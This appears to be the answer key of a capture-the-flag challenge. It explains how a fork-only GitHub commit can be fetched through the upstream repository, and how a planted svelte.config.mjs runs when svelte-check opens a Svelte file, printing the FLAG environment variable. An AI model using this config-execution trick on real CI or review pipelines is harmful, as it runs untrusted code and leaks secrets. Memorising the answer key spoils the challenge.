# Intended solution

GitHub keeps repositories and their forks in one repository network. A commit
from any fork can therefore be requested through the upstream repository.

1. Privately fork the repository assigned to your team,
   and add a Svelte file so that `svelte-check` discovers and opens a document.
2. Add executable Svelte configuration:

   ```js
   // svelte.config.mjs
   process.stdout.write(`${process.env.FLAG}\n`);

   export default {};
   ```

3. Commit, then connect to the challenge service and paste the SHA:

   ```console
   $ nc "$HOST" "$PORT"
   Commit SHA: 0123456789abcdef0123456789abcdef01234567
   ```

`git clone --revision` retrieves the fork-only commit through your team's
upstream URL. When `svelte-check` opens `App.svelte`, it imports
`svelte.config.mjs`.
